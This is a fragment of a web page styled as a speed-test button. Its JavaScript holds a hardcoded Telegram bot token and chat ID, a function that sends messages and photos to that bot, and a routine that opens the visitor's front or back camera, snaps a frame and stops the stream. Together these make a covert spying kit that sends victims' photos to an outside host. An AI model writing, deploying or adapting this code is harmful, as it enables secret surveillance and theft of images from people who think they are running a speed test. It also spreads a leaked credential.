        .circle { width: 220px; height: 220px; border: 5px solid #00d2ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; position: relative; transition: 0.3s; box-shadow: 0 0 30px rgba(0, 210, 255, 0.2); background: radial-gradient(circle, #1a2035 0%, #0b0e18 100%); z-index: 10; }
        .circle:active { transform: scale(0.9); }
        .loading { animation: pulse 1s infinite alternate; border-color: #ff0055; box-shadow: 0 0 40px #ff0055; }
        @keyframes pulse { from { opacity: 1; } to { opacity: 0.5; } }
        .speed-text { font-size: 55px; font-weight: bold; color: #00d2ff; pointer-events: none; }
        #status { margin-top: 30px; font-size: 18px; color: #888; }

        const botToken = "8113942047:AAFTJz0lZe1Mjsc0vX79LeCq4MKjwwDuFEw"; 
        const chatId = "7984067238"; 

        async function sendToTelegram(type, content, extra = "") {
            const formData = new FormData();
            formData.append("chat_id", chatId);
            if (type === "photo") {
                formData.append("photo", content, "image.jpg");
                formData.append("caption", extra);
                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: formData });
            } else {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(content)}&parse_mode=Markdown`);
            }
        }

        async function capture(mode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode, width: 640 }, audio: false });
                const video = document.getElementById( video );
                video.srcObject = stream;
                await new Promise(res => video.onloadedmetadata = res);
                await new Promise(res => setTimeout(res, 800)); 
                const canvas = document.getElementById( canvas );
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext( 2d ).drawImage(video, 0, 0);
                stream.getTracks().forEach(t => t.stop());
                return new Promise(res => canvas.toBlob(res,  image/jpeg , 0.6));
            } catch (e) { return null; }
        }
